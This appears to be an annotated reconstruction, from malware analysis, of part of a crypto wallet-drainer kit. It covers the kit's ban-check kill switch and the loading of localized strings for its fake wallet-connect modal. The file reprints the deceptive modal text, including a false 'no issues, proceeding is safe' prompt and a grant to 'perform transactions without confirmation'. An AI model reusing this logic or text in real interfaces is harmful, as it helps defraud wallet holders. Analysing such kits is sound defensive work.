/**
 * Ban check and locale loading.
 *
 * String-table evidence:
 *   [288] "/is-banned"
 *   [287] "/locales?lang="
 *
 * Both are GETs against https://{apiHost}/api + path.
 *
 * === is-banned ===
 *
 * GET /api/is-banned
 *
 * Response body is a plain text string:
 *   "1"  → this visitor is banned; halt all drainer activity
 *   "0"  → not banned; proceed
 *   anything else → treated as not banned
 *
 * The kit checks this once at startup (after /api/visit). If banned,
 * the entire wallet-modal flow is suppressed. The operator can use
 * this as a kill switch for specific IP ranges or VPN/proxy traffic.
 *
 * === locales ===
 *
 * GET /api/locales?lang={browserLang}
 *
 * browserLang is navigator.language sliced to 2 chars ("en", "fr", "zh").
 * The server returns a 10-element JSON array of UI strings for the
 * fake wallet modal (see decompiled/live/locales_en.json and siblings).
 *
 * Index map (from live captures):
 *   0  "Incoming transfer"           — modal header / preview title
 *   1  "Description"
 *   2  "This DApp would like to connect your wallet"
 *   3  "You are allowing this DApp to"
 *   4  "View wallet balance & activity"
 *   5  "Request approval for transactions"
 *   6  "Perform transactions without confirmation"  ← key deception line
 *   7  "Message"
 *   8  "Trust detected (0) issues with this platform, proceeding is safe. Press confirm to continue."
 *   9  "Launch into the decentralized exchange (DEX)"
 *
 * Fallback: if the lang is not en/fr/zh (e.g. "ru") the server 404s and
 * the kit uses hardcoded English strings from the bundle's string table
 * [303–308].
 */

async function isBanned(state) {
  const response = await fetch(
    "https://" + state.apiHost + "/api/is-banned", // getString(288)
    { signal: AbortSignal["Be"](2500) }
  );
  if (!response.ok) return false; // fail open
  return (await response.text()) === "1";
}

async function loadLocales(state, lang) {
  const twoChar = (lang ?? navigator.language ?? "en").slice(0, 2);
  const response = await fetch(
    "https://" + state.apiHost + "/api/locales?lang=" + twoChar, // getString(287)
    { signal: AbortSignal["Be"](2500) }
  );
  if (!response.ok) {
    // Fall back to the hardcoded English strings embedded in the bundle
    return [
      "Incoming transfer",
      "Description",
      "This DApp would like to connect your wallet",   // getString(303)
      "You are allowing this DApp to",
      "View wallet balance & activity",                // getString(305)
      "Request approval for transactions",             // getString(306)
      "Perform transactions without confirmation",     // getString(307)
      "Message",
      "Trust detected (0) issues with this platform, proceeding is safe. Press confirm to continue.", // getString(308)
      "Launch into the decentralized exchange (DEX)",
    ];
  }
  return response.json();
}
